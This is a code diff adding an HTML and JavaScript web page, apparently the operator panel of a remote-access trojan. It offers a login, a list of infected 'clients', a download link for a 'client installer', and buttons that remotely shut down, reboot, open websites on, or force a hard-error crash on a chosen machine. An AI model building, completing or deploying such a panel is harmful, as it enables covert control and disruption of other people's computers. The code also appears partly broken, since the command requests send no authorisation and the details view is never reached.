@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Client Management</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body> 
+  <div id="app">
+    <h1>Client Management</h1>
+    <div id="login-container">
+      <video class="background-video" autoplay loop muted poster="https://i.pinimg.com/originals/9d/37/a8/9d37a8ab76ebc8086da37442fc815b7a.gif">
+          <source src="https://cdn.glitch.global/e276c002-689d-4727-bec2-c8f49570f031/river%20(1).mp4?v=1747743170334" type="video/mp4">
+      </video>
+      <h2>Login</h2>
+      <input type="text" id="username" placeholder="Username" onkeyup="handleEnterKey(event)">
+      <input type="password" id="password" placeholder="Password" onkeyup="handleEnterKey(event)">
+      <button onclick="login()">Login</button>
+    </div>
+    <div id="home-container" style="display:none;">
+      <video class="background-video" autoplay loop muted poster="https://i.pinimg.com/originals/9d/37/a8/9d37a8ab76ebc8086da37442fc815b7a.gif">
+          <source src="https://www.dropbox.com/scl/fi/84676c8ua1ltv0wk6eiz4/Green-Hacker-Binary-Code-Animation.mp4?rlkey=h2hcbpuv2qypsz8jkstd0mvno&st=id6u3j15&dl=1" type="video/mp4">
+      </video>
+      <h2>Client List</h2>
+      <ul id="client-list"></ul>
+      <a href="https://drive.google.com/file/d/185LL_xPP9y-kfP2fxZxWzjnKcn1Pe_sl/view?usp=sharing" download>Download Client Installer</a>
+      <div id="client-details" style="display:none;">
+        <h3 id="client-id"></h3>
+        <button onclick="shutdown()">Shutdown</button>
+        <button onclick="reboot()">Reboot</button>
+        <button onclick="openWebsite()">Open Website</button>
+        <button onclick="deleteClient()">Delete Client</button>
+        <button onclick="raiseHardError()">Raise Hard Error</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    function handleEnterKey(event) {
+      if (event.key === 'Enter') {
+        login();
+      }
+    }
+
+    function login() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      fetch('/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.token) {
+          localStorage.setItem('token', data.token);
+          document.getElementById('login-container').style.display = 'none';
+          document.getElementById('home-container').style.display = 'block';
+          loadClients();
+        } else {
+          alert('Invalid credentials');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+    
+function loadClients() {
+  fetch('/clients', {
+    headers: {
+      'Authorization': 'Bearer ' + localStorage.getItem('token')
+    }
+  })
+  .then(response => response.json())
+  .then(clients => {
+    const clientList = document.getElementById('client-list');
+    clientList.innerHTML = '';
+    clients.forEach(client => {
+      const li = document.createElement('li');
+      const link = document.createElement('a');
+      link.href = `/clients/${client._id}`;
+      link.innerText = `${client.clientId} - ${client.friendlyName}`;
+      li.appendChild(link);
+      clientList.appendChild(li);
+    });
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+}
+
+function showClientDetails(clientId) {
+  console.log('Fetching details for client:', clientId); // Debugging
+  fetch(`/clients/${clientId}`, {
+    headers: {
+      'Authorization': 'Bearer ' + localStorage.getItem('token')
+    }
+  })
+  .then(response => response.text()) // Log eerst als tekst
+  .then(text => {
+    console.log('Raw response:', text); // Debugging
+    const client = JSON.parse(text); // Vervolgens pas JSON proberen
+    document.getElementById('client-id').innerText = clientId;
+    document.getElementById('client-details').style.display = 'block';
+  })
+  .catch(error => {
+    console.error('Error fetching client details:', error);
+  });
+}
+
+
+    function shutdown() {
+      const clientId = document.getElementById('client-id').innerText;
+      fetch(`/clients/${clientId}/shutdown`, {
+        method: 'POST'
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert('Shutdown command executed');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+
+    function reboot() {
+      const clientId = document.getElementById('client-id').innerText;
+      fetch(`/clients/${clientId}/reboot`, {
+        method: 'POST'
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert('Reboot command executed');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+
+    function openWebsite() {
+      const clientId = document.getElementById('client-id').innerText;
+      fetch(`/clients/${clientId}/openwebsite`, {
+        method: 'POST'
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert('Open website command executed');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+
+    function deleteClient() {
+      const clientId = document.getElementById('client-id').innerText;
+      fetch(`/clients/${clientId}`, {
+        method: 'DELETE'
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert('Client verwijderd');
+        loadClients(); // Refresh de client lijst
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+
+    function raiseHardError() {
+      const clientId = document.getElementById('client-id').innerText;
+      fetch(`/clients/${clientId}/raiseHardError`, {
+        method: 'POST'
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert('Hard error raised');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+  </script>
+</body>
+</html>
